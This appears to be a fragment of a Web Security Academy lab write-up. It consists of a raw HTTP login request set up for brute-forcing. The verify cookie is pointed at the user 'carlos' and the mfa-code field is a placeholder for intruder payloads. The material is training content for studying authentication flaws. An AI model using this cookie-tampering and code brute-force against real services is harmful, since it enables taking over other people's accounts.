
`%s` is used as a placeholder to the intruder payloads

```http
POST /login2 HTTP/2
Host: 0a1a00be03d321e3812325dc00150086.web-security-academy.net
Cookie: verify=carlos;
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a1a00be03d321e3812325dc00150086.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1a00be03d321e3812325dc00150086.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

mfa-code=%s
```